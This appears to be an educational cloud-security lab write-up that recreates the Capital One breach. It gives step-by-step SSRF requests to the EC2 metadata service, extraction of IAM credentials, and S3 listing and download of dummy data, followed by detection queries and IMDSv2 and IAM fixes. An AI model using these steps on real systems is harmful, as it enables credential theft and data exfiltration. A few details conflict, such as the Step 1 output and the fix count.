### How One Misconfigured WAF Cost Capital One $80 Million

> **Series:** The AWS Autopsy — Real Cloud Breaches, Dissected **Difficulty:** Intermediate **Lab Time:** ~45 minutes **AWS Cost:** Near zero (t2.micro — free tier eligible)
> 
> **GitHub:** [AWS-Autopsy | Case #01](https://github.com/ridamdarji25/AWS-Autopsy/tree/main/Case-01-SSRF-IAM-CapitalOne)

* * *

## ⚠️ Legal & Ethical Disclaimer

**Read this before proceeding.**

This article and the accompanying lab are created **strictly for educational and defensive security research purposes.**

*   ✅ Run this lab **only** on AWS infrastructure you personally own
    
*   ✅ This is intended to help security professionals **understand and defend** against real attack vectors
    
*   ❌ Do **not** use any technique shown here on systems you do not own
    
*   ❌ Do **not** use this for any malicious, unauthorized, or illegal activity
    
*   ❌ Unauthorized access to computer systems is a **criminal offense** in most countries
    

By continuing, you agree that you are using this content solely for ethical security research and education.

> The author takes no responsibility for any misuse of the information presented in this article.

* * *

## The Victim

| Field | Details |
| --- | --- |
| **Organisation** | Capital One Financial Corporation |
| **Date** | March–July 2019 |
| **Attacker** | Paige Thompson — former AWS engineer |
| **Records Exposed** | 100+ million customers (US & Canada) |
| **Regulatory Fine** | $80,000,000 |
| **Root Cause** | SSRF + IMDSv1 + overpermissive IAM |

* * *

## The Story

Most people think cloud breaches require sophisticated zero-days or nation-state actors.

The Capital One breach required one HTTP request.

A former AWS engineer discovered a Web Application Firewall running on an EC2 instance that was vulnerable to **Server-Side Request Forgery (SSRF)**. SSRF is a vulnerability where an attacker tricks a server into making HTTP requests on their behalf — including requests to internal services that are never supposed to be reachable externally.

In AWS, one internal endpoint is extraordinarily sensitive: the **EC2 Instance Metadata Service (IMDS)** at `169.254.169.254`. This endpoint returns — among other things — the temporary IAM credentials of the role attached to that EC2 instance.

With **IMDSv1** (the default configuration at the time), no authentication was required to access this endpoint. Any process that could make an outbound HTTP request could retrieve those credentials.

She sent one request through the vulnerable WAF. The server returned the IAM credentials. The IAM role had access to S3 buckets across the account. One hundred million records. Gone.

* * *

## The Kill Chain

```plaintext
[Attacker]
    │
    │  HTTP GET /fetch?url=http://169.254.169.254/...
    ▼
[EC2 — Vulnerable WAF / Fetch Service]
    │
    │  SSRF: server forwards request internally
    ▼
[169.254.169.254 — EC2 IMDSv1]
    │
    │  Returns IAM role credentials — no auth required
    ▼
[IAM Role — S3 List + Read access]
    │
    │  ListAllMyBuckets → ListBucket → GetObject
    ▼
[S3 Buckets — sensitive data]
    │
    │  Full data exfiltration
    ▼
[100M+ records stolen]
```

**Attack Complexity:** LOW **Preventability:** 100%

* * *

## Lab Architecture

This lab recreates the vulnerable environment faithfully:

*   **EC2 instance** running a Flask web app with a vulnerable `/fetch` endpoint (simulates the misconfigured WAF)
    
*   **IAM role** with S3 read permissions attached to the EC2
    
*   **IMDSv1 enabled** — the vulnerable metadata configuration
    
*   **Private S3 bucket** containing dummy sensitive data
    
<img width="1693" height="929" alt="ChatGPT Image May 3, 2026, 10_43_54 PM" src="https://github.com/user-attachments/assets/5d467270-6355-48d4-8f12-3d7bb983c74f" />


* * *

## Prerequisites

*   AWS account (free tier works)
    
*   AWS CLI configured (`aws configure`)
    
*   Terraform v1.3+ installed
    
*   Basic familiarity with EC2 and IAM
    

* * *

## Part 1 — Lab Setup

> **Clone the repository:**

```bash
git clone https://github.com/ridamdarji25/AWS-Autopsy
cd AWS-Autopsy/Case-01-SSRF-IAM-CapitalOne/terraform
```

<img width="1242" height="495" alt="Screenshot 2026-05-03 225151" src="https://github.com/user-attachments/assets/c8d9e0f1-e395-48de-af04-78fa93bb91fd" />
<br>

> **Open** `terraform.tfvars` **and set your unique prefix:**

```hcl
prefix     = "yourname"   # ← change this to your unique name
aws_region = "us-east-1"
```

Why prefix? Every resource name uses your prefix — `yourname-autopsy-role`, `yourname-autopsy-sg`, `yourname-autopsy-sensitive-xxxx` — so there are no naming conflicts if multiple people run this lab.

<img width="735" height="160" alt="Screenshot 2026-05-03 225413" src="https://github.com/user-attachments/assets/8655a9dc-15c5-4183-9d0c-ac536cacd1a8" />
<br>

> **Deploy the lab:**

```bash
terraform init
terraform apply
```

Type `yes` when prompted. Wait **2–3 minutes** for EC2 `user_data` to finish — it installs Python, Flask, and starts the app automatically via systemd.

<img width="1246" height="715" alt="Screenshot 2026-05-03 225755" src="https://github.com/user-attachments/assets/02678845-c3c8-4826-98d7-98e17625b379" />
<br>
<img width="1255" height="532" alt="Screenshot 2026-05-03 230555" src="https://github.com/user-attachments/assets/5044b2ee-a647-4977-89f8-7dfb46bfd9fc" />
<br>

> **Note the outputs:**

```plaintext
ec2_public_ip        = "54.XXX.XXX.XXX"
flask_app_url        = "http://54.XXX.XXX.XXX:5000"
sensitive_bucket     = "yourname-autopsy-sensitive-a1b2c3d4"
iam_role_name        = "yourname-autopsy-role"
```

> **Verify the app is running**

```bash
http://$EC2_IP:5000/health   -- IN Browser
```

Expected output:

```json
{"status": "running"}
```
<img width="790" height="326" alt="Screenshot 2026-05-03 230954" src="https://github.com/user-attachments/assets/0394e794-5cce-42bd-9bfd-f28ba32eb1d0" />

* * *

## Part 2 — The Attack

> ⚠️ Perform these steps only on your own lab. This is your infrastructure, your account.

### Step 1 — Confirm SSRF

```bash
http://<IP>:5000/fetch?url=http://127.0.0.1:5000
```

You should see the HTML of example.com returned through the server. **SSRF confirmed** — the server is making requests on our behalf.

<img width="1919" height="1052" alt="Screenshot 2026-05-03 231917" src="https://github.com/user-attachments/assets/e17dee66-69e1-49e8-98ae-872216a6522b" />

***

### Step 2 — Reach the Metadata Service

The EC2 metadata service at `169.254.169.254` is only accessible from within the EC2 instance itself. Through SSRF, we route our request through the server to reach it.

```bash
http://$EC2_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/
```

Expected output:

```plaintext
ami-id
hostname
iam/
instance-id
instance-type
local-ipv4
public-ipv4
```

We are now inside the metadata service.

<img width="1919" height="345" alt="Screenshot 2026-05-03 232002" src="https://github.com/user-attachments/assets/6e5f8ff2-d0f7-4dbc-9eb2-c7153428e4cd" />

***

### Step 3 — Get the IAM Role Name

```bash
http://$EC2_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Expected output:

```plaintext
yourname-autopsy-role
```

<img width="1919" height="407" alt="Screenshot 2026-05-03 232134" src="https://github.com/user-attachments/assets/dee551cd-91fd-4b66-97b2-9357ce81be51" />

***

### Step 4 — Steal the Credentials

```bash
http://$EC2_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/yourname-autopsy-role
```

Expected output:

```json
{
  "Code"            : "Success",
  "AccessKeyId"     : "ASIA5XXXXXXXXXXXXXXXXX",
  "SecretAccessKey" : "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "Token"           : "AQoDYXdzEJr...",
  "Expiration"      : "2025-01-01T12:00:00Z"
}
```

These are **live, valid, temporary AWS credentials** — stolen via a single HTTP request.

<img width="1919" height="539" alt="Screenshot 2026-05-03 232234" src="https://github.com/user-attachments/assets/9bc261f5-6a98-44a4-a1bc-1e373698b31f" />

***

### Step 5 — Export the Stolen Credentials

Copy the values from the JSON response in Step 4 and export them:

```bash
export AWS_ACCESS_KEY_ID="ASIA5XXXXXXXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
export AWS_SESSION_TOKEN="AQoDYXdzEJr..."
```

<img width="1297" height="424" alt="Screenshot 2026-05-03 234029" src="https://github.com/user-attachments/assets/50d69787-e0d9-4b78-82d1-6710477270c8" />

***

### Step 6 — Verify Identity with STS

Before touching S3, confirm whose identity we are operating as:

```bash
aws sts get-caller-identity
```

Expected output:

```json
{
    "UserId": "AROA5XXXXXXXXXXXXXXXXX:i-0xxxxxxxxxxxxxxxxx",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/yourname-autopsy-role/i-0xxxxxxxxxxxxxxxxx"
}
```

This confirms we are now acting **as the EC2 IAM role** — from our own machine, outside AWS.

<img width="1234" height="394" alt="Screenshot 2026-05-03 234451" src="https://github.com/user-attachments/assets/36c204e3-c7f2-4abc-b6c2-a2b5a30362b5" />

* * *

### Step 7 — List All S3 Buckets in the Account

```bash
aws s3 ls
```

Expected output:

```plaintext
2024-01-01 10:00:00 yourname-autopsy-sensitive-a1b2c3d4
```

List Contents of the Sensitive Bucket

```bash
aws s3 ls s3://yourname-autopsy-sensitive-xxxx --recursive
```

Expected output:

```plaintext
2024-01-01 10:00:00    156 customer-data/records.csv
2024-01-01 10:00:00    112 internal/db-config.json
```

<img width="1255" height="500" alt="Screenshot 2026-05-03 235056" src="https://github.com/user-attachments/assets/f4910c10-762f-4b28-a10a-0d0b62b17c64" />

* * *

### Step 8 — Download and View the Stolen Data

```bash
# Download the files
aws s3 cp s3://yourname-autopsy-sensitive-xxxx/customer-data/records.csv ./stolen.csv
aws s3 cp s3://yourname-autopsy-sensitive-xxxx/internal/db-config.json ./stolen-config.json
```

```bash
# View the data
cat stolen.csv
cat stolen-config.json
```

Expected output:

```plaintext
id,name,ssn,card
1,John Doe,XXX-XX-1234,4111111111111111
2,Jane Smith,XXX-XX-5678,4222222222222222
```

<img width="1292" height="522" alt="Screenshot 2026-05-03 235503" src="https://github.com/user-attachments/assets/081256d4-db2c-4ffd-b950-a58f9edd492b" />

* * *

> **💀 Attack complete.**

5 commands. Zero malware. Zero exploits. Just a misconfigured server and a default AWS setting.

In the Capital One incident, this was **100 million rows** of real customer data.

* * *

## Part 3 — Detection

What should have caught this?

### GuardDuty Finding

Enable GuardDuty and it automatically raises:

`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`

This fires when EC2 instance credentials are used from an IP address outside AWS — exactly what happens when an attacker steals credentials via SSRF and uses them from their own machine.

```bash
# Enable GuardDuty
aws guardduty create-detector --enable --region us-east-1
```

### CloudTrail — What to Look For

In CloudTrail, look for:

*   `GetCredentials` calls from unexpected source IPs
    
*   `ListBucket` / `GetObject` events from the EC2 role originating from a non-AWS IP
    
*   Any API call using the instance role from outside the EC2's known IP
    

### Athena Query on CloudTrail Logs

```sql
SELECT
  eventTime,
  userIdentity.arn,
  sourceIPAddress,
  eventName,
  requestParameters
FROM cloudtrail_logs
WHERE
  eventSource = 's3.amazonaws.com'
  AND eventName IN ('GetObject', 'ListBucket', 'ListAllMyBuckets')
  AND userIdentity.sessionContext.sessionIssuer.userName = 'yourname-autopsy-role'
  AND sourceIPAddress NOT LIKE '%.amazonaws.com'
ORDER BY eventTime DESC
LIMIT 50;
```

Any S3 access from a non-AWS IP using an EC2 role is a **critical red flag**.

* * *

## Part 4 — Remediation

Two fixes. Both are minimal changes in Terraform.

### Fix 1 — Enforce IMDSv2 (Kills the Attack Completely)

IMDSv2 requires a session token obtained via a PUT request with a specific TTL header. SSRF cannot replicate this — it only supports GET requests. **This single change would have completely prevented the Capital One breach.**

In `ec2.tf`, change one line:

```hcl
metadata_options {
  http_endpoint = "enabled"
  http_tokens   = "required"   # ← was "optional" — this kills SSRF credential theft
}
```

Apply the fix:

```bash
terraform apply
```

Now repeat Step 4 of the attack — you will get an empty or blocked response. The credentials are no longer accessible.

### Fix 2 — Restrict IAM Permissions (Limits Blast Radius)

Even if credentials are stolen, limit what they can access. The role should only reach the specific bucket and path it needs — not everything in the account.

In `iam.tf`, replace the policy:

```hcl
Statement = [{
  Effect   = "Allow"
  Action   = [
    "s3:GetObject",
    "s3:PutObject"
  ]
  Resource = "arn:aws:s3:::yourname-autopsy-sensitive-*/app/*"  # specific path only
}]
```

### Fix 3 — GuardDuty + CloudTrail Always On

```hcl
# guardduty.tf
resource "aws_guardduty_detector" "main" {
  enable = true
}

# cloudtrail.tf
resource "aws_cloudtrail" "autopsy_trail" {
  name                          = "autopsy-trail"
  s3_bucket_name                = aws_s3_bucket.trail_logs.id
  include_global_service_events = true
  is_multi_region_trail         = true
  enable_log_file_validation    = true
}
```

* * *

## Cleanup — Important

Always destroy lab resources when done. Do **not** run this with stolen credentials set:

```bash
# First clear any stolen credentials
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

# Then destroy
cd terraform/
terraform destroy
```

Type `yes` to confirm. All EC2, IAM, S3, and Security Group resources will be removed.

<img width="1315" height="451" alt="Screenshot 2026-05-03 235729" src="https://github.com/user-attachments/assets/8f79c025-d532-4b06-af33-4c75b13a2e9a" />
<br>
<img width="1301" height="388" alt="Screenshot 2026-05-03 235808" src="https://github.com/user-attachments/assets/79d67f49-2275-4172-9692-0f70f3e278d8" />

* * *

## The 3 Lessons from Case #01

**1/ IMDSv1 is a loaded gun.** Any service that can make outbound HTTP requests — WAFs, proxies, Lambda functions, internal APIs — can steal your EC2 IAM credentials if IMDSv1 is enabled. Enforce IMDSv2 everywhere. It is a one-line change.

**2/ Specific permissions still cause massive damage.** You don't need `s3:*` to lose everything. `ListAllMyBuckets` + `ListBucket` + `GetObject` was enough to exfiltrate 100 million records. Restrict not just the actions but the specific resource ARNs.

**3/ Detection without alerting is just logging.** Logs without real-time alerting give you forensics after the fact — not prevention. GuardDuty + CloudWatch alarms + SNS = you find out in minutes, not months.

* * *

## What's Next

**Case #02** drops next week:

> *I gave a test account 3 extra permissions.* *In 10 minutes — full AWS takeover.* *This is exactly how Uber got breached in 2022.*

Follow on [LinkedIn](http://www.linkedin.com/in/ridamdarji) and [Hashnode](https://theawsautopsy.hashnode.dev/) so you don't miss it.

⭐ **Star the repo** to get notified when Case #02 drops → [github.com/ridamdarji25/AWS-Autopsy](https://github.com/ridamdarji25/AWS-Autopsy)

* * *

## References

*   [Capital One — OCC Enforcement Action (2020)](https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-166.html)
    
*   [AWS IMDSv2 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
    
*   [AWS IAM Security Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
    
*   [GuardDuty InstanceCredentialExfiltration Finding Types](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html)
    
*   [OWASP SSRF Definition](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
    

* * *

*The AWS Autopsy is an educational series on real cloud security incidents. Every technique demonstrated is for defensive security research only. Always obtain proper authorisation before testing any system you do not own.*

*Found this useful? Share it with your team. Every AWS engineer should run this lab at least once.*

* * *

**Tags:** `aws` `cloud-security` `ethical-hacking` `terraform` `devsecops` `iam` `ssrf` `security-research`
